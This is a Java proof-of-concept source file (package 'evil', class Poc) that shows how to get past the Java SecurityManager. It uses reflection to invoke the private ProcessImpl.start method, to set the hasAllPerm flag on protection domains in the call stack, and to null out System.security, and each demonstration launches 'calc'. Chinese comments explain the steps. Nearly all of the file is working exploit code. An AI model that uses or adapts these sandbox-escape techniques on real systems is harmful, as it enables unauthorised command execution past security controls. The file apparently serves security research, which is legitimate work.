package evil;

import sun.reflect.Reflection;

import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.ProtectionDomain;
import java.util.Map;

public class Poc {
    public static void main(String[] args) {

        //Run with: -Djava.security.manager -Djava.security.policy==bypass-by-reflection.policy

        executeCommandWithReflection("calc");
        exec("calc");
        //setHasAllPerm0();
    }

    public static void exec(String command) {
        try {
            Runtime.getRuntime().exec(command);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void executeCommandWithReflection(String command) {
        try {
            Class clz = Class.forName("java.lang.ProcessImpl");
            Method method = clz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
            method.setAccessible(true);
            method.invoke(clz, new String[]{command}, null, null, null, false);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void setHasAllPerm0() {
        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();
        //遍历栈帧
        for (StackTraceElement stackTraceElement : stackTraceElements) {
            try {
                Class clz = Class.forName(stackTraceElement.getClassName());
                //利用反射调用getProtectionDomain0方法
                Method getProtectionDomain = clz.getClass().getDeclaredMethod("getProtectionDomain0", null);
                getProtectionDomain.setAccessible(true);
                ProtectionDomain pd = (ProtectionDomain) getProtectionDomain.invoke(clz);

                if (pd != null) {
                    Field field = pd.getClass().getDeclaredField("hasAllPerm");
                    field.setAccessible(true);
                    field.set(pd, true);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        exec("calc");
    }

    public static void setHasAllPerm() {

        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();
        //遍历栈帧
        for (StackTraceElement stackTraceElement : stackTraceElements) {
            try {
                //反射当前栈帧中的类
                Class clz = Class.forName(stackTraceElement.getClassName());
                Field field = clz.getProtectionDomain().getClass().getDeclaredField("hasAllPerm");
                //压制java的访问检查
                field.setAccessible(true);
                //把hasAllPerm置为true
                field.set(clz.getProtectionDomain(), true);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        exec("calc");
    }

    public static void setSecurityByReflection() {
        try {
            Class clz = Class.forName("java.lang.System");
            Field field = clz.getDeclaredField("security");
            field.setAccessible(true);
            field.set(System.class, null);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
